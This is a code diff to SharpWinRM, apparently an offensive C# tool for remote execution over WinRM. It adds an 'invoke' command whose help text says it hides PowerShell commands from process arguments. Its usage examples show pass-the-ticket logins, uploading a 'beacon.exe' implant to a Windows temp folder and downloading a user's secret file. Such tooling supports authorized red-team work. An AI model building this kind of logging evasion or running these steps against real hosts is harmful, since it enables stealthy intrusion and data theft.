@@ -25,6 +25,7 @@ namespace SharpWinRM
             switch (args.Command)
             {
                 case "exec":     Exec.Run(args, ctx);     break;
+                case "invoke":   Invoke.Run(args, ctx);   break;
                 case "upload":   Upload.Run(args, ctx);   break;
                 case "download": Download.Run(args, ctx); break;
                 default:
@@ -100,7 +101,8 @@ namespace SharpWinRM
             Console.WriteLine();
             Console.WriteLine("  COMMANDS");
             Console.WriteLine("    scan      Check if WinRM ports 5985/5986 are open (no auth required)");
-            Console.WriteLine("    exec      Execute a command with output");
+            Console.WriteLine("    exec      Execute a command via cmd.exe (command visible in process args)");
+            Console.WriteLine("    invoke    Execute a PowerShell command via stdin (command NOT in process args)");
             Console.WriteLine("    upload    Upload a local file to the remote host");
             Console.WriteLine("    download  Download a remote file to local disk");
             Console.WriteLine();
@@ -121,13 +123,15 @@ namespace SharpWinRM
             Console.WriteLine("    /nocolors          Disable colored output");
             Console.WriteLine();
             Console.WriteLine("  COMMAND OPTIONS");
-            Console.WriteLine("    exec:               /command:CMD");
+            Console.WriteLine("    exec / invoke:      /command:CMD");
             Console.WriteLine("    upload / download:  /local:PATH  /remote:PATH");
             Console.WriteLine();
             Console.WriteLine("  EXAMPLES");
             Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /domain:CORP /user:jdoe /password:Pass1 /command:whoami");
             Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /user:CORP\\jdoe /ptt /command:whoami");
             Console.WriteLine("    SharpWinRM.exe exec     /target:srv01 /user:CORP\\jdoe /ticket:jdoe.kirbi /command:whoami");
+            Console.WriteLine("    SharpWinRM.exe invoke   /target:srv01 /user:CORP\\jdoe /ptt /command:Get-LocalUser");
+            Console.WriteLine("    SharpWinRM.exe invoke   /target:srv01 /user:CORP\\jdoe /ptt /command:Get-Process | Select Name,Id");
             Console.WriteLine("    SharpWinRM.exe upload   /target:srv01 /user:CORP\\jdoe /ptt /local:beacon.exe /remote:C:\\Windows\\Temp\\b.exe");
             Console.WriteLine("    SharpWinRM.exe download /target:srv01 /user:CORP\\jdoe /ptt /remote:C:\\Users\\jdoe\\secret.txt /local:secret.txt");
             Console.WriteLine();
